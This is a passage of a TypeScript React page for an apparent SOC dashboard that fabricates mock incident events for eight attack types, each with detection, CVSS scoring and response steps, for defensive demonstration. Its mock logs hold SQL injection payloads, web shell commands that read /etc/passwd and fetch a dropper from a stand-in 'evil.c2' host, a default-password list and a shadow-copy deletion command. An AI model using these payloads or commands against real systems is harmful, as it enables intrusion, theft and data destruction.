"use client";

import { useState, useRef, useEffect } from "react";
import { saveSimulatedEvents, clearSimulatedEvents, readSimulatedEvents } from "@/lib/mockData";

// ─── Helpers ────────────────────────────────────────────────────────────────

function uuid() {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}
function randInt(min: number, max: number) { return Math.floor(Math.random() * (max - min + 1)) + min; }
function randIp(prefix = "192.168") { return `${prefix}.${randInt(1, 254)}.${randInt(1, 254)}`; }
function now(offsetMs = 0) { return new Date(Date.now() + offsetMs).toISOString(); }

// ─── SOC Pipeline Layers ─────────────────────────────────────────────────────

const PIPELINE_LAYERS = [
  { id: "l1", label: "Layer 1", sub: "Feature Engineering", icon: "⚙️",  color: "#06b6d4", desc: "Normalising logs, extracting temporal, behavioural & network features" },
  { id: "l2", label: "Layer 2", sub: "Threat Detection",    icon: "🔎",  color: "#8b5cf6", desc: "Running rule-based & anomaly detection engines" },
  { id: "l3", label: "Layer 3", sub: "CIS Benchmarking",   icon: "📋",  color: "#f59e0b", desc: "Mapping to CIS Controls framework and enriching observables" },
  { id: "l4", label: "Layer 4", sub: "AI Analysis",        icon: "🤖",  color: "#ec4899", desc: "Generating intent narratives and attack vectors via LLM analysis" },
  { id: "l5", label: "Layer 5", sub: "CVSS Scoring",       icon: "📊",  color: "#14b8a6", desc: "Computing CVSS v3.1 base scores for prioritisation" },
  { id: "l6", label: "Layer 6", sub: "Response Playbook",  icon: "🛡️",  color: "#22c55e", desc: "Generating containment steps and analyst recommendations" },
];

// ─── Mock Incident Generator ─────────────────────────────────────────────────

// eslint-disable-next-line @typescript-eslint/no-explicit-any
function makeBaseEvent(opts: {
  ts: string; srcIp: string; dstIp?: string | null; port?: number | null;
  protocol?: string | null; action: string; logType: string; affectedHost: string;
  url?: string | null; httpMethod?: string | null; httpStatus?: number | null;
  bytesIn?: number; bytesOut?: number; threatType: string; severity: string;
  confidence: number; intent: string; summary: string; narrative: string;
  cisBenchmarkId: string; cisTitle: string; cisDesc: string; cisRemediation: string;
  cvssScore: number; cvssVector: string; priority: string;
  actions: string[]; containment: string[]; anomalyFlags: string[]; anomalyScore: number;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
}): Record<string, any> {
  const h = new Date(opts.ts).getHours();
  const day = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"][new Date(opts.ts).getDay()];
  const isWeekend = day === "Saturday" || day === "Sunday";
  const isOffHours = h < 8 || h > 18;
  const timeOfDay = h < 12 ? "morning" : h < 17 ? "afternoon" : "evening";
  const srcInternal = opts.srcIp.startsWith("10.") || opts.srcIp.startsWith("192.168.") || opts.srcIp.startsWith("172.");
  const dstInternal = opts.dstIp ? (opts.dstIp.startsWith("10.") || opts.dstIp.startsWith("192.168.")) : true;
  // Per-event CVSS variation: ±0.8 around the base, clamped to [1.0, 10.0], 1 decimal
  const rawVariation = (Math.random() - 0.5) * 1.6;
  const cvssScore = Math.round(Math.min(10.0, Math.max(1.0, opts.cvssScore + rawVariation)) * 10) / 10;
  const dashSeverity = cvssScore >= 9 ? "critical" : cvssScore >= 7 ? "high" : cvssScore >= 4 ? "medium" : "low";
  const eventId = uuid();

  const cvssVec: Record<string,string> = {};
  opts.cvssVector.split("/").forEach(p => { const [k,v] = p.split(":"); if (k && v) cvssVec[k] = v; });

  return {
    summary: `Suspicious ${opts.action} from ${opts.srcIp} targeting ${opts.dstIp ?? opts.url ?? opts.affectedHost}`,
    event_id: eventId,
    raw_event: {
      timestamp: opts.ts, log_type: opts.logType, source_ip: opts.srcIp,
      destination_ip: opts.dstIp ?? null, port: opts.port ?? null,
      protocol: opts.protocol ?? null, action: opts.action,
      affected_host: opts.affectedHost,
      ...(opts.url ? { url: opts.url } : {}),
      ...(opts.httpMethod ? { http_method: opts.httpMethod } : {}),
    },
    ingestion: {
      timestamp: opts.ts, source_ip: opts.srcIp, dest_ip: opts.dstIp ?? null,
      src_port: 0, dest_port: opts.port ?? 0, protocol: opts.protocol ?? null,
      action: opts.action, bytes_in: opts.bytesIn ?? 0, bytes_out: opts.bytesOut ?? 0,
      log_family: opts.logType, url_path: opts.url ?? null, http_method: opts.httpMethod ?? null,
      http_status_code: opts.httpStatus ?? null, user_agent: null,
    },
    feature_engineering: {
      temporal_features: { event_count_1m: 1, event_count_5m: 1, event_count_15m: 1, event_count_1h: 1, is_frequency_accelerating: true, is_first_seen_source: true, sequence_position_in_1m: 1, is_off_hours: isOffHours },
      behavioral_features: { deviation_score: 0.85, is_off_hours_for_user: isOffHours, is_new_ip_for_user: true, is_new_user: true, excessive_failed_logins: opts.action === "failed_login", baseline_established: false, normal_hours_count: 1, normal_ips_count: 1, failed_login_count: opts.action === "failed_login" ? 1 : 0, rare_source_ip: true, rare_user_activity: true, login_failure_spike: opts.action === "failed_login" },
      statistical_features: { z_score: 2.4, event_count_window: 1 },
      frequency_features: { current_window_count: 1, zscore: 2.4, percentile_rank: 0.97, spike_detected: true, history_window_count: 0 },
      pattern_features: { port_scan_detected: opts.action === "port_scan", brute_force_detected: opts.action === "failed_login", exfiltration_detected: opts.action === "data_transfer", lateral_movement_detected: opts.action === "lateral_movement", unique_ports_seen: opts.action === "port_scan" ? 8 : 1, failed_login_count: opts.action === "failed_login" ? 10 : 0, avg_bytes_out: opts.bytesOut ?? 0, unique_hosts_seen: opts.action === "lateral_movement" ? 5 : 1 },
      network_traffic_features: { traffic_direction: srcInternal && dstInternal ? "east_west" : "north_south", src_is_internal: srcInternal, dst_is_internal: dstInternal, bytes_ratio: opts.bytesIn ? (opts.bytesOut ?? 0) / opts.bytesIn : 0, dest_port_service: opts.port === 22 ? "ssh" : opts.port === 443 ? "https" : opts.port === 80 ? "http" : opts.port === 3389 ? "rdp" : "unknown", is_known_port: [22,80,443,3306,3389].includes(opts.port ?? 0), is_high_risk_port: [22,3389,445].includes(opts.port ?? 0), has_tcp_flags: false, tcp_flag_value: null, is_syn_only: false, packet_count: randInt(10, 500), duration_ms: randInt(100, 5000), bytes_per_packet: randInt(64, 1500) },
      network_protocol_features: { protocol: opts.protocol ?? "tcp", is_protocol_expected: true, is_deprecated_protocol: false, is_tunneling_capable: opts.protocol === "https", is_new_protocol_for_source: true, unique_protocols_for_source: 1, protocol_anomaly_detected: false },
      user_profile: { user_key: opts.srcIp, is_new_user: true, current_hour: h, current_source_ip: opts.srcIp, is_new_ip_for_user: true, total_events_seen: 1, failed_login_count: 0, unique_ips_seen: 1, current_action: opts.action, current_event_type: "unknown" },
      identity_features: { risky_signin: opts.action === "failed_login" },
      classification_scores: { network: opts.logType === "network" ? 1 : 0, web: opts.logType === "web" ? 1 : 0, iot: 0 },
      time_windows: { timestamp_parsed: opts.ts, window_1m: opts.ts.slice(0,16), window_5m: opts.ts.slice(0,16), window_15m: opts.ts.slice(0,16), window_1h: opts.ts.slice(0,13)+":00", hour_of_day: h, day_of_week: day, is_weekend: isWeekend, is_off_hours: isOffHours, time_of_day: timeOfDay },
      log_family: opts.logType,
    },
    detection: {
      label: "malicious", threat_type: opts.threatType, severity: opts.severity,
      confidence: opts.confidence, triggered_engines: ["signature", "anomaly", "ml"],
      reasoning: [
        `High-confidence ${opts.threatType} pattern detected`,
        "Source IP has no legitimate baseline",
        `Anomaly flag: ${opts.anomalyFlags[0] ?? "unusual_activity"}`,
      ],
    },
    anomaly_detection: {
      anomaly_score: opts.anomalyScore,
      anomaly_level: opts.anomalyScore > 0.7 ? "critical" : opts.anomalyScore > 0.5 ? "high" : "medium",
      anomaly_flags: opts.anomalyFlags,
      reasoning: opts.anomalyFlags.map(f => `Detected: ${f.replaceAll("_", " ")}`),
    },
    threat_analysis: {
      matched_patterns: [opts.threatType], mapped_pattern: opts.threatType,
      severity: opts.severity, confidence: opts.confidence,
      reasoning: [`Pattern matches ${opts.threatType} TTP`],
    },
    ioc_enrichment: {
      observables: { ips: [opts.srcIp], domains: [], urls: opts.url ? [opts.url] : [], hashes: [] },
      matched: true, risk_level: opts.severity, match_count: 1, matched_iocs: [opts.srcIp],
    },
    correlation_analysis: {
      correlated: true, correlation_strength: "strong", signal_count: 3,
      supporting_signals: opts.anomalyFlags.slice(0, 3),
      reasoning: ["Multiple correlated signals detected in same time window"],
      adjusted_confidence: Math.min(opts.confidence + 0.1, 1.0),
    },
    cis: {
      benchmark_id: opts.cisBenchmarkId, framework: "CIS Controls v8",
      title: opts.cisTitle, description: opts.cisDesc, remediation: opts.cisRemediation,
    },
    ai_analysis: {
      intent: opts.intent, summary: opts.summary,
      one_liner: opts.summary,
      attack_vector: opts.logType === "web" ? "network" : "network",
      attack_complexity: "low", privileges_required: "none", user_interaction: "none", scope: "changed",
      impact: { confidentiality: "high", integrity: "high", availability: "high" },
      narrative: opts.narrative,
      next_steps: opts.actions,
    },
    cvss: {
      vector: cvssVec, vector_string: opts.cvssVector,
      base_score: cvssScore,
      severity: dashSeverity,
    },
    response: {
      priority: opts.priority, recommended_actions: opts.actions,
      containment_steps: opts.containment, analyst_notes: opts.narrative,
    },
    final_report: { owner: "SOC Tier-2", status: "open" },
    // Explicit dashboard block — used by both dashboard card and incident header
    dashboard: {
      alert_title: opts.summary,
      severity: dashSeverity,
      cvss_score: cvssScore,
      source_ip: opts.srcIp,
      affected_user: opts.affectedHost,
    },
  };
}

// ─── Attack Templates ─────────────────────────────────────────────────────────

type AttackConfig = {
  id: string; label: string; icon: string; description: string;
  severity: "critical" | "high" | "medium"; color: string;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  generateEvents: () => Record<string, any>[];
};

const ATTACKS: AttackConfig[] = [
  {
    id: "port_scan", label: "Port Scan / Recon", icon: "🔍",
    description: "Attacker probes multiple ports to map open services before exploitation.",
    severity: "medium", color: "#f59e0b",
    generateEvents: () => {
      const src = randIp("192.168");
      const ports = [
        { num: 22,   proto: "tcp",  svc: "ssh",      result: "filtered" },
        { num: 80,   proto: "tcp",  svc: "http",     result: "open" },
        { num: 443,  proto: "tcp",  svc: "https",    result: "open" },
        { num: 3306, proto: "tcp",  svc: "mysql",    result: "filtered" },
        { num: 5432, proto: "tcp",  svc: "postgres",  result: "closed" },
        { num: 8080, proto: "tcp",  svc: "http-alt", result: "open" },
        { num: 8443, proto: "tcp",  svc: "https-alt", result: "filtered" },
        { num: 3389, proto: "tcp",  svc: "rdp",      result: "open" },
      ];
      return ports.map((p, i) => ({
        ...makeBaseEvent({
          ts: now(i * 500), srcIp: src, dstIp: "10.0.0.5", port: p.num, protocol: p.proto,
          action: "port_scan", logType: "network", affectedHost: "server-01",
          threatType: "reconnaissance", severity: "medium", confidence: 0.82,
          intent: "Port Scanning / Reconnaissance",
          summary: `Port scan from ${src} on port ${p.num} — ${p.svc} service discovery`,
          narrative: `${src} is performing systematic port scanning across ${ports.length} ports on 10.0.0.5. Covers SSH, HTTP, HTTPS, database, and RDP ports — consistent with pre-exploitation reconnaissance (MITRE T1046). Scan rate indicates automated tooling.`,
          cisBenchmarkId: "CIS-13", cisTitle: "Network Monitoring & Defense", cisDesc: "Monitor network traffic for unauthorized scanning activity", cisRemediation: "Deploy IDS rules to block sequential port scans. Block source IP at perimeter firewall.",
          cvssScore: 5.3, cvssVector: "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", priority: "P2",
          actions: ["Block source IP at edge firewall", "Review firewall rules for port exposure", "Enable IDS alerting for scan patterns"],
          containment: ["Block IP at perimeter", "Enable port-scan detection in SIEM"],
          anomalyFlags: ["rare_source_ip", "sequential_port_scan", "rapid_connection_attempts"], anomalyScore: 0.65,
          bytesIn: 48, bytesOut: 0,
        }),
        raw_event: {
          timestamp: now(i * 500),
          log_type: "network",
          source_ip: src,
          destination_ip: "10.0.0.5",
          port: p.num,
          protocol: p.proto,
          action: "port_scan",
          service: p.svc,
          result: p.result,
        },
      }));
    },
  },
  {
    id: "brute_force", label: "SSH Brute Force", icon: "🔨",
    description: "Rapid failed SSH login attempts targeting server credentials.",
    severity: "high", color: "#ef4444",
    generateEvents: () => {
      const src = `45.${randInt(1,254)}.${randInt(1,254)}.${randInt(1,254)}`;
      const users = ["admin","root","ubuntu","pi","oracle","postgres","deploy","jenkins","vagrant","ansible"];
      const passwords = ["password","123456","admin","letmein","qwerty","root","toor","pass123","secret","changeme"];
      return Array.from({ length: 10 }, (_, i) => ({
        ...makeBaseEvent({
          ts: now(i * 200), srcIp: src, dstIp: "10.10.0.20", port: 22, protocol: "tcp",
          action: "failed_login", logType: "auth", affectedHost: "ssh-gateway",
          threatType: "brute_force", severity: "high", confidence: 0.94,
          intent: "SSH Credential Brute-Force Attack",
          summary: `SSH brute-force from ${src} — attempt ${i + 1}/10 targeting user '${users[i % users.length]}'`,
          narrative: `${src} is conducting automated SSH brute-force against 10.10.0.20. ${i + 1} failed login attempts targeting: ${users.slice(0, i + 1).join(", ")}. Attack rate exceeds 5 attempts/second, consistent with Hydra/Medusa tooling (MITRE T1110.001). Immediate credential lockout required.`,
          cisBenchmarkId: "CIS-5", cisTitle: "Account Management", cisDesc: "Manage access to prevent credential-based attacks", cisRemediation: "Enable account lockout after 5 failed attempts. Implement MFA on SSH. Use fail2ban.",
          cvssScore: 8.1, cvssVector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", priority: "P1",
          actions: ["Immediately block source IP", "Lock targeted accounts", "Enable MFA on SSH access"],
          containment: ["Block IP at edge firewall", "Force password reset", "Enable fail2ban"],
          anomalyFlags: ["excessive_failed_logins", "login_failure_spike", "rare_source_ip", "automated_attack_pattern"], anomalyScore: 0.92,
          bytesIn: 0, bytesOut: 0,
        }),
        raw_event: {
          timestamp: now(i * 200),
          log_type: "auth",
          source_ip: src,
          destination_ip: "10.10.0.20",
          port: 22,
          protocol: "tcp",
          action: "failed_login",
          auth_user: users[i % users.length],
          auth_password_hint: passwords[i % passwords.length],
          auth_result: "denied",
          attempt_number: i + 1,
          command: `ssh ${users[i % users.length]}@10.10.0.20 (attempt ${i+1}/10)`,
        },
      }));
    },
  },
  {
    id: "sql_injection", label: "SQL Injection", icon: "💉",
    description: "Malicious SQL payloads injected into web application fields.",
    severity: "critical", color: "#8b5cf6",
    generateEvents: () => {
      const src = `91.240.${randInt(1,254)}.${randInt(1,254)}`;
      const payloads = [
        { url: "/login?user=admin'+OR+'1'='1",                          hint: "Auth bypass via tautology",         httpStatus: 200 },
        { url: "/search?q=1;+DROP+TABLE+users;--",                       hint: "Destructive DDL injection",          httpStatus: 500 },
        { url: "/api/user?id=1+UNION+SELECT+username,password+FROM+accounts--", hint: "UNION-based data extraction",  httpStatus: 200 },
        { url: "/products?id=1'+AND+SLEEP(5)--",                         hint: "Time-based blind SQLi (5s delay)",  httpStatus: 200 },
        { url: "/login?user=admin'--",                                   hint: "Comment-based auth bypass",          httpStatus: 302 },
      ];
      return payloads.map((p, i) => ({
        ...makeBaseEvent({
          ts: now(i * 800), srcIp: src, dstIp: null, port: 443, protocol: "https",
          action: "suspicious_request", logType: "web", affectedHost: "web-server-01",
          url: p.url, httpMethod: "GET", httpStatus: p.httpStatus,
          threatType: "sql_injection", severity: "critical", confidence: 0.97,
          intent: "SQL Injection — Database Compromise Attempt",
          summary: `SQL injection from ${src}: ${p.hint}`,
          narrative: `Attacker ${src} is executing SQL injection attacks. Payload: "${p.url}". Technique: ${p.hint}. Targets authentication and data retrieval layers — potential for auth bypass, data leakage, or full database compromise (MITRE T1190, T1059.007). Deploy WAF block rule immediately.`,
          cisBenchmarkId: "CIS-16", cisTitle: "Application Software Security", cisDesc: "Manage security lifecycle and prevent injection vulnerabilities", cisRemediation: "Implement parameterised queries. Deploy WAF with SQLi rules. Sanitise all user inputs.",
          cvssScore: 9.8, cvssVector: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", priority: "P1",
          actions: ["Block attacker IP at WAF", "Audit all database queries from this session", "Enable WAF in blocking mode"],
          containment: ["Block source IP at WAF", "Rotate database credentials", "Enable query logging"],
          anomalyFlags: ["sql_injection_pattern", "rare_source_ip", "malicious_payload_detected"], anomalyScore: 0.97,
          bytesIn: 0, bytesOut: 512,
        }),
        raw_event: {
          timestamp: now(i * 800),
          log_type: "web",
          source_ip: src,
          destination_ip: "10.0.0.80",
          port: 443,
          protocol: "https",
          action: "suspicious_request",
          url: p.url,
          http_method: "GET",
          http_status: p.httpStatus,
          payload_hint: p.hint,
        },
      }));
    },
  },
  {
    id: "c2_beaconing", label: "C2 Beaconing", icon: "📡",
    description: "Compromised host beaconing to a command-and-control server.",
    severity: "critical", color: "#ec4899",
    generateEvents: () => {
      const dst = `203.0.${randInt(1,254)}.${randInt(1,254)}`;
      const beaconPayloads = [
        { phase: "initial check-in",     bytesOut: 512 },
        { phase: "config pull",           bytesOut: 1280 },
        { phase: "keylogger data upload", bytesOut: 640 + randInt(0, 256) },
        { phase: "screenshot capture",   bytesOut: 89600 },
        { phase: "credential harvest",   bytesOut: 448 + randInt(0, 128) },
        { phase: "persistence install",  bytesOut: 720 },
      ];
      return Array.from({ length: 6 }, (_, i) => ({
        ...makeBaseEvent({
          ts: now(i * 30000), srcIp: "10.0.0.42", dstIp: dst, port: 443, protocol: "https",
          action: "beaconing", logType: "network", affectedHost: "endpoint-23",
          bytesIn: 128, bytesOut: beaconPayloads[i].bytesOut,
          threatType: "command_and_control", severity: "critical", confidence: 0.91,
          intent: "C2 Beaconing — Active Malware Communication",
          summary: `Beacon ${i + 1}/6 from infected host 10.0.0.42 to C2 server ${dst} [${beaconPayloads[i].phase}]`,
          narrative: `Endpoint 10.0.0.42 is beaconing to suspected C2 ${dst} via HTTPS with regular 30s intervals. Payload size consistency (512–768 bytes) matches known RAT/botnet behaviour (MITRE T1071.001, T1573). Host is fully compromised — isolate immediately.`,
          cisBenchmarkId: "CIS-13", cisTitle: "Network Monitoring & Defense", cisDesc: "Detect and respond to malicious C2 communication", cisRemediation: "Isolate endpoint. Block C2 IP at all egress points. Begin forensic investigation.",
          cvssScore: 9.1, cvssVector: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L", priority: "P1",
          actions: ["Isolate endpoint 10.0.0.42", "Block C2 IP at all firewalls", "Capture memory dump"],
          containment: ["Network isolate endpoint", "Block C2 IP at DNS and firewall", "Scan subnet for lateral movement"],
          anomalyFlags: ["c2_beaconing_pattern", "regular_interval_traffic", "external_c2_communication"], anomalyScore: 0.91,
        }),
        raw_event: {
          timestamp: now(i * 30000),
          log_type: "network",
          source_ip: "10.0.0.42",
          destination_ip: dst,
          port: 443,
          protocol: "https",
          action: "beaconing",
          bytes_in: 128,
          bytes_out: beaconPayloads[i].bytesOut,
          beacon_phase: beaconPayloads[i].phase,
          beacon_interval: "30s",
        },
      }));
    },
  },
  {
    id: "data_exfil", label: "Data Exfiltration", icon: "📤",
    description: "Large outbound transfers from a database server to an external IP.",
    severity: "critical", color: "#f97316",
    generateEvents: () => {
      const dst = `185.199.${randInt(1,254)}.${randInt(1,254)}`;
      const chunks = [
        { file: "customers_pii.tar.gz",    mb: 48  },
        { file: "transactions_2025.csv.gz", mb: 120 },
        { file: "credit_cards_encrypted.db",mb: 32  },
        { file: "auth_tokens_dump.sql",     mb: 8   },
        { file: "employee_hr_records.tar",  mb: 75  },
      ];
      return Array.from({ length: 5 }, (_, i) => ({
        ...makeBaseEvent({
          ts: now(i * 2000), srcIp: "10.0.0.15", dstIp: dst, port: 443, protocol: "https",
          action: "data_transfer", logType: "network", affectedHost: "db-server-01",
          bytesIn: 512, bytesOut: 1024 * 1024 * chunks[i].mb,
          threatType: "data_exfiltration", severity: "critical", confidence: 0.89,
          intent: "Data Exfiltration — Large Outbound Transfer",
          summary: `Exfiltration chunk ${i + 1}/5 — ${chunks[i].file} (${chunks[i].mb}MB) → ${dst}`,
          narrative: `Database server 10.0.0.15 is transferring ${chunks[i].mb}MB to external IP ${dst}. Asymmetric bytes ratio is a strong exfiltration indicator. Traffic encrypted via HTTPS prevents content inspection (MITRE T1048). Notify DPO and legal team immediately.`,
          cisBenchmarkId: "CIS-3", cisTitle: "Data Protection", cisDesc: "Protect sensitive data from unauthorised transfer", cisRemediation: "Implement DLP rules. Restrict DB server egress. Monitor high-volume outbound transfers.",
          cvssScore: 9.4, cvssVector: "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N", priority: "P1",
          actions: ["Block outbound from db-server-01", "Identify what data was transferred", "Notify DPO"],
          containment: ["Block all outbound from db-server-01", "Revoke database credentials", "Enable full packet capture"],
          anomalyFlags: ["high_bytes_out", "asymmetric_traffic", "external_data_transfer"], anomalyScore: 0.89,
        }),
        raw_event: {
          timestamp: now(i * 2000),
          log_type: "network",
          source_ip: "10.0.0.15",
          destination_ip: dst,
          port: 443,
          protocol: "https",
          action: "data_transfer",
          filename: chunks[i].file,
          bytes_out: 1024 * 1024 * chunks[i].mb,
          bytes_in: 512,
          affected_host: "db-server-01",
        },
      }));
    },
  },
  {
    id: "web_shell", label: "Web Shell Upload", icon: "🐚",
    description: "Attacker uploads a PHP web shell for persistent remote access.",
    severity: "critical", color: "#14b8a6",
    generateEvents: () => {
      const src = `185.199.${randInt(1,254)}.${randInt(1,254)}`;
      const cmds = [
        { url: "/admin/upload.php",                         method: "POST", action: "web_attack",         hint: "Web shell upload via admin panel",   httpStatus: 200, cmd: null },
        { url: "/uploads/shell.php?cmd=whoami",             method: "GET",  action: "remote_code_exec",   hint: "RCE: identity check",              httpStatus: 200, cmd: "whoami" },
        { url: "/uploads/shell.php?cmd=cat+/etc/passwd",   method: "GET",  action: "remote_code_exec",   hint: "RCE: /etc/passwd read",             httpStatus: 200, cmd: "cat /etc/passwd" },
        { url: "/uploads/shell.php?cmd=ls+-la+/var/www",   method: "GET",  action: "remote_code_exec",   hint: "RCE: web root enumeration",          httpStatus: 200, cmd: "ls -la /var/www" },
        { url: "/uploads/shell.php?cmd=curl+http://evil.c2/dropper.sh+-o+/tmp/d.sh", method: "GET", action: "dropper_download", hint: "RCE: secondary dropper download", httpStatus: 200, cmd: "curl http://evil.c2/dropper.sh -o /tmp/d.sh" },
      ];
      return cmds.map((c, i) => ({
        ...makeBaseEvent({
          ts: now(i * 1000), srcIp: src, dstIp: "10.0.0.80", port: 80, protocol: "http",
          action: c.action, logType: "web", affectedHost: "web-server-02",
          url: c.url, httpMethod: c.method, httpStatus: c.httpStatus,
          threatType: "web_shell", severity: "critical", confidence: 0.96,
          intent: "Web Shell Installation & Remote Code Execution",
          summary: `Web shell from ${src}: ${c.hint}`,
          narrative: `Attacker ${src} uploaded a PHP web shell via admin upload panel and is executing OS commands remotely. Commands: whoami, /etc/passwd, directory enumeration. Full server compromise achieved (MITRE T1505.003). Isolate web-server-02 immediately.`,
          cisBenchmarkId: "CIS-16", cisTitle: "Application Software Security", cisDesc: "Detect and remediate web application exploitation", cisRemediation: "Remove web shell. Disable executable file uploads. Implement file integrity monitoring.",
          cvssScore: 10.0, cvssVector: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H", priority: "P1",
          actions: ["Isolate web-server-02", "Remove web shell from /uploads", "Audit all modified files"],
          containment: ["Take web-server-02 offline", "Restore from known-good backup", "Block shell pattern at WAF"],
          anomalyFlags: ["file_upload_to_executable_dir", "remote_code_execution", "web_shell_detected"], anomalyScore: 0.96,
          bytesIn: 4096, bytesOut: 8192,
        }),
        raw_event: {
          timestamp: now(i * 1000),
          log_type: "web",
          source_ip: src,
          destination_ip: "10.0.0.80",
          port: 80,
          protocol: "http",
          action: c.action,
          url: c.url,
          http_method: c.method,
          http_status: c.httpStatus,
          command: c.cmd,
        },
      }));
    },
  },
  {
    id: "lateral_movement", label: "Lateral Movement", icon: "↔️",
    description: "Compromised host pivoting across internal systems via SMB/RDP/WMI.",
    severity: "high", color: "#06b6d4",
    generateEvents: () => {
      const targets = [
        { ip: "10.0.0.11", port: 445,  proto: "smb",   svc: "SMB file share",         action: "smb_enum_shares" },
        { ip: "10.0.0.15", port: 3389, proto: "rdp",   svc: "RDP remote desktop",     action: "rdp_login_attempt" },
        { ip: "10.0.0.20", port: 5985, proto: "winrm", svc: "WinRM PS remoting",      action: "winrm_invoke_command" },
        { ip: "10.0.0.30", port: 135,  proto: "dcom",  svc: "DCOM remote execution",  action: "dcom_remote_exec" },
        { ip: "10.0.0.50", port: 22,   proto: "ssh",   svc: "SSH lateral pivot",      action: "ssh_key_reuse_login" },
      ];
      return targets.map((t, i) => ({
        ...makeBaseEvent({
          ts: now(i * 3000), srcIp: "10.0.0.5", dstIp: t.ip, port: t.port, protocol: t.proto,
          action: t.action, logType: "network", affectedHost: `internal-host-${i + 1}`,
          threatType: "lateral_movement", severity: "high", confidence: 0.88,
          intent: "Lateral Movement — Internal Network Pivot",
          summary: `Lateral move from 10.0.0.5 → ${t.ip} via ${t.proto.toUpperCase()} (${t.svc})`,
          narrative: `Compromised host 10.0.0.5 is pivoting to ${t.ip} using ${t.proto.toUpperCase()}. Step ${i + 1}/5 in sequential internal pivot (MITRE T1021). Attacker expanding foothold across internal network — implement network segmentation and isolate source immediately.`,
          cisBenchmarkId: "CIS-12", cisTitle: "Network Infrastructure Management", cisDesc: "Prevent attacker lateral movement with network controls", cisRemediation: "Implement network segmentation. Restrict lateral protocols. Deploy EDR on all endpoints.",
          cvssScore: 8.8, cvssVector: "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L", priority: "P1",
          actions: ["Isolate 10.0.0.5 immediately", "Block lateral protocols between segments", "Hunt for persistence mechanisms"],
          containment: ["Isolate affected network segment", "Block SMB/RDP/WinRM between segments", "Reset pivot host credentials"],
          anomalyFlags: ["lateral_movement_detected", "internal_pivot_pattern", "sequential_host_access"], anomalyScore: 0.88,
          bytesIn: 2048, bytesOut: 4096,
        }),
        raw_event: {
          timestamp: now(i * 3000),
          log_type: "network",
          source_ip: "10.0.0.5",
          destination_ip: t.ip,
          port: t.port,
          protocol: t.proto,
          action: t.action,
          service: t.svc,
          pivot_step: `${i + 1}/5`,
          affected_host: `internal-host-${i + 1}`,
        },
      }));
    },
  },
  {
    id: "ransomware", label: "Ransomware", icon: "💀",
    description: "Mass file encryption events across multiple workstations.",
    severity: "critical", color: "#dc2626",
    generateEvents: () => {
      const encryptedExtensions = [".locked", ".enc", ".crypted", ".ryk", ".pay2me", ".crypt", ".lck", ".cryptolocker"];
      const processes = ["svchost.exe (hollowed)", "explorer.exe (injected)", "lsass.exe (dumped)", "wscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe", "cmd.exe /c vssadmin delete shadows"];
      return Array.from({ length: 8 }, (_, i) => ({
        ...makeBaseEvent({
          ts: now(i * 100), srcIp: "10.0.0.77", dstIp: null, port: null, protocol: null,
          action: "file_encryption", logType: "endpoint", affectedHost: `workstation-${i + 1}`,
          bytesIn: 0, bytesOut: 0,
          threatType: "ransomware", severity: "critical", confidence: 0.99,
          intent: "Active Ransomware — Mass File Encryption",
          summary: `Ransomware encrypting workstation-${i + 1} — ${(1000 + i * 500).toLocaleString()} files affected`,
          narrative: `CRITICAL: Active ransomware on workstation-${i + 1}. ${(1000 + i * 500).toLocaleString()} files encrypted with ${encryptedExtensions[i % encryptedExtensions.length]} extension. Process: ${processes[i % processes.length]}. Coordinated attack across ${8} endpoints (MITRE T1486). Shut down affected systems immediately. Do NOT pay ransom without legal guidance.`,
          cisBenchmarkId: "CIS-11", cisTitle: "Data Recovery", cisDesc: "Restore assets from immutable backups after ransomware", cisRemediation: "Shut down affected systems. Restore from offline backups. Do NOT pay ransom without legal guidance.",
          cvssScore: 10.0, cvssVector: "AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H", priority: "P1",
          actions: ["IMMEDIATELY shut down all affected workstations", "Disconnect from network", "Activate BCP", "Engage IR team"],
          containment: ["Power off encrypting workstations", "Isolate network segment", "Restore from offline backups"],
          anomalyFlags: ["mass_file_encryption", "ransomware_extension_detected", "process_hollowing", "rapid_file_changes"], anomalyScore: 0.99,
        }),
        raw_event: {
          timestamp: now(i * 100),
          log_type: "endpoint",
          source_ip: "10.0.0.77",
          destination_ip: null,
          action: "file_encryption",
          affected_host: `workstation-${i + 1}`,
          filename: `${(1000 + i * 500).toLocaleString()} files renamed to *${encryptedExtensions[i % encryptedExtensions.length]}`,
          process: processes[i % processes.length],
          file_count: 1000 + i * 500,
          ransom_note: i === 0 ? "README_DECRYPT.txt dropped" : null,
        },
      }));
    },
  },
];

// ─── Types ────────────────────────────────────────────────────────────────────

type Phase = "idle" | "logs" | "pipeline" | "writing" | "done" | "error";
type LogLine = {
  id: number;
  ts: string;
  type: string;
  src: string;
  action: string;
  // enriched per-event context
  dst?: string;
  port?: number;
  proto?: string;
  detail?: string;   // url / command / filename / bytes string
  status?: string;  // HTTP status, auth result, severity badge
};
type LayerState = "waiting" | "running" | "done";
type HistoryCount = number;

// ─── Component ────────────────────────────────────────────────────────────────

export default function UploadPage() {
  const [selected, setSelected] = useState<AttackConfig | null>(null);
  const [phase, setPhase]       = useState<Phase>("idle");
  const [logLines, setLogLines]  = useState<LogLine[]>([]);
  const [layerStates, setLayerStates] = useState<LayerState[]>(PIPELINE_LAYERS.map(() => "waiting"));
  const [statusMsg, setStatusMsg] = useState("");
  const [eventCount, setEventCount] = useState(0);
  const [historyCount, setHistoryCount] = useState<HistoryCount>(0);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => { logEndRef.current?.scrollIntoView({ behavior: "smooth" }); }, [logLines]);

  // Load accumulated history count on mount
  useEffect(() => {
    setHistoryCount(readSimulatedEvents().length);
  }, []);

  const reset = () => {
